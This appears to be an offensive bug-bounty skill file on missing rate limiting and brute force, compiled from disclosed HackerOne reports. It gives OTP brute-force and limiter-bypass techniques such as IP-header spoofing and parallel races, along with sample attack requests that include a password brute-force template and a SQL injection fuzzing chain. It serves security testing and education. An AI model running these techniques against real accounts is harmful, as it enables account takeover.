---
name: rate-limit-bruteforce
description: "Missing Rate Limiting & Brute Force offensive playbook from 74 disclosed HackerOne reports (6 critical, 10 high, 29 medium, 29 low). Use when hunting or reviewing missing rate limiting & brute force. Triggers: rate, password, limit, brute, force."
license: "For authorized security testing and education only."
---

# Missing Rate Limiting & Brute Force

> Distilled from **74** disclosed HackerOne reports. Real examples and the full
> report list are in [reference.md](reference.md).

## What it is

Security-sensitive actions (login, OTP, password reset, coupon/redeem, invite) lack throttling, enabling brute force, enumeration, or abuse.

## Where to hunt

- Find low-entropy secrets checked online: 4-6 digit OTPs, short reset codes, coupon codes.
- Look for endpoints with no CAPTCHA/lockout and stable success/error responses.

## Exploitation playbook

- Brute the OTP/2FA code (10^4-10^6 space) with high concurrency.
- Enumerate valid usernames/emails via differing responses or timing.

## Bypass techniques

- Rotate `X-Forwarded-For`/`X-Real-IP`, spoof client IP headers the limiter trusts.
- Distribute across sessions/tokens; reset counters by re-triggering the flow; race parallel requests.

## Impact & escalation

- OTP brute → account takeover; reset-code brute → password reset of any user.

## Remediation

- Server-side, principal-scoped rate limits and lockouts; CAPTCHA; increase secret entropy; do not trust client IP headers.

## Concrete payloads & PoCs

Extracted from disclosed writeups. Adapt to the target; test only where authorized.

### 1. [#487656](https://hackerone.com/reports/487656)  -  HTTP PUT method is enabled ratelimited.me
*critical*

```http
PUT /codeslayer137.txt HTTP/1.1
Host: ratelimited.me
Cookie: __cfduid=dfa5166b2ed63c2a5078df85a46ec5e941548497323; fs_uid=rs.fullstory.com`HCE07`57688203…
Content-Length: 21

Testing CodeSlayer137
```

### 2. [#794395](https://hackerone.com/reports/794395)  -  No Rate Limit On forgot Password Leading To Massive Email Flooding
*medium*

```http
POST /a/forgot-password HTTP/1.1
Host: accounts.companyhub.com
Referer: https://accounts.companyhub.com/auth/credentials/forgotpassword
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 30
Cookie: __cfduid=df9a10acb0ed6c3beb1b456f31191d0381581499643; _ga=GA1.2.1112499432.1581499640; _gid=…

Email=apugodspower%40gmail.com
```

### 3. [#2039447](https://hackerone.com/reports/2039447)  -  Entering passwords on the Share Login Page can lead to a brute-forc…
*low*

```http
POST /share/████████/password HTTP/1.1
Host: app.crowdsignal.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 43
Origin: https://app.crowdsignal.com
Referer: https://app.crowdsignal.com/share/██████
Cookie:

action=password&nonce=██████████&password=§
```

### 4. [#1024880](https://hackerone.com/reports/1024880)  -  SSL expired subdomain leads to API swap with main and flagged cooki…
*medium*

```
Calling URL: https://launchpad.37signals.com/session
Post Data: utf8=%E2%9C%93&authenticity_token=&product=bcx&account_id=2479412&username=VALIDCREDENTIALS&password=VALIDCREDENTIALS&commit=Log+in
Sent Headers:
sec-fetch-dest: document
sec-fetch-mode: navigate
sec-fetch-site: same-origin
sec-fetch-user: ?1
upgrade-insecure-requests: 1
user-agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Mobile Safari/537.36
Content-Type: application/x-www-form-urlencoded
Sent Cookies:

Address: https://launchpad.37signals.com/basecamp/2479412/signin
Response code: 200 (OK)
Received headers:
Server: openresty
Date: Tue, 03 Nov 2020 00:04:38 GMT
Content-Type: text/html; charset=utf-8
Transfer-Encoding: chunked
Connection: keep-alive
Status: 200 OK
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
X-Download-Options: noopen
X-Permitted-Cross-Domain-Policies: none
Referrer-Policy: strict-origin-when-cross-origin
X-Robots-Tag: noindex
ETag: W/"dc3b5ec708ae44cc631cdf4e5bcd6d07"
Cache-Control: max-age=0, private, must-revalidate
X-Request-Id: 8b45d3f2-5977-4d3c-b016-202865d4e134
X-Runtime: 0.007610
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
Timing-Allow-Origin: *
Received cookies:
# … truncated …
```

### 5. [#1069034](https://hackerone.com/reports/1069034)  -  Grinchs website takendown with various other exploits
*critical*

```
So every time **URL** is sent one has to extract the token from this `img` tag and send that again to search query in this fashion.

**STEP 1**: Take the fuzzed URL

URL=`
...link...hash=8291%27+UNION+SELECT+%22%27+union+select+1,2,%27../api/`**FUZZ**`%27%23%22,null,null%23
`

**STEP2**: Send the request to the website, from the response fetch the value of data from the img tag (`src` value), and then send the request again to capture the response.


**STEP3**: Check for the response, we get "Expected HTTP status 200, Received: 400" as the response for most of the keywords, so the if the condition would be like anything but `Expected HTTP status 200, Received: 404
`

[img20](https://i.imgur.com/RLAz4iH.png)
{F1138738}

Using this method, found out that there exists two paths, one `user` and other `sleep` which threw `Invalid content type detected`

[img21](https://i.imgur.com/C7Uo3DO.png)
{F1138739}

So now we have a valid path, what's next? maybe there are more paths to it => Nothing

How about params? so the same URL as in STEP 1, but slight change.


**STEP 4**: Take the fuzzed URL

URL=`
...link...hash=8291%27+UNION+SELECT+%22%27+union+select+1,2,%27../api/user?`**FUZZ**`%27%23%22,null,null%23
`

repeat **step 2 and 3**, with a change that we are now getting `Expected HTTP status 200, Received: 400`.

# … truncated …
```

### 6. [#475167](https://hackerone.com/reports/475167)  -  Apache mod_negotiation filename bruteforcing https://api.ratelimite…
*low*

```http
GET /index HTTP/1.1
Host: api.ratelimited.me
Cookie: __cfduid=d1223d3114b0d6a19cb09dbdbf358c2721544548659; fs_uid=rs.fullstory.com`HCE07`56668233…

## Impact
```

More payloads: see [payloads.md](payloads.md) (42 curated).

## Recurring patterns in this dataset

Most frequent terms across the 74 reports (term (count)): `rate` (47), `password` (45), `limit` (33), `brute` (32), `force` (32), `protection` (25), `login` (17), `bruteforce` (15), `limiting` (15), `attacker` (14), `allowed` (12), `endpoint` (12), `missing` (12), `attacks` (11), `lack` (11), `access` (11), `accounts` (11), `reset` (11)

## Worked example  -  [report #332632](https://hackerone.com/reports/332632)

*(Possible) staff account takeover via reset token bruteforce at helpdesk.bistudio.com* (critical,  - )

> As stated in a brief exchange with @rvn in my other report 312433, I might have found a logic flaw in the way https://helpdesk.bistudio.com handles the reset flow and tokens. I've asked if it was possible to obtain a test account, but I fully understand that it's something that cannot be done; as such I'll submit a "blind" report based on my black-box analysis and wait for your team to verify it. Also note that this flaw seems to also be present in the "Set out of office email response" flow, albeit less critical. Flow The SYSTEM PASSWORD RESET flow is a 3-steps process: 1. the staff member requests a SMS TOKEN using the first form 2. the 6-digits SMS TOKEN is used in the second form 3. the…

## Top disclosed examples

| Report | Severity | Bounty | Program | Title |
| :-- | :-- | :-- | :-- | :-- |
| [#332632](https://hackerone.com/reports/332632) | critical |  -  | bohemia | (Possible) staff account takeover via reset token bruteforce at helpdesk.bistudio.com |
| [#766875](https://hackerone.com/reports/766875) | critical |  -  | palo_alto_software | weak protection against brute-forcing on login api leads to account takeover |
| [#487656](https://hackerone.com/reports/487656) | critical |  -  | ratelimited | HTTP PUT method is enabled ratelimited.me |
| [#1069034](https://hackerone.com/reports/1069034) | critical |  -  | h1-ctf | Grinchs website takendown with various other exploits |
| [#1069189](https://hackerone.com/reports/1069189) | critical |  -  | h1-ctf | Grinch-Networks taken down - hacky holidays CTF |
| [#894198](https://hackerone.com/reports/894198) | critical |  -  | h1-ctf | [H1-2006 2020]  Includes 1 free content discovery |
| [#1987062](https://hackerone.com/reports/1987062) | high | $500 | nextcloud | Password reset endpoint is not brute force protected |
| [#703972](https://hackerone.com/reports/703972) | high |  -  | pixiv | Reset any password |

*See [reference.md](reference.md) for all 74 reports in this class.*
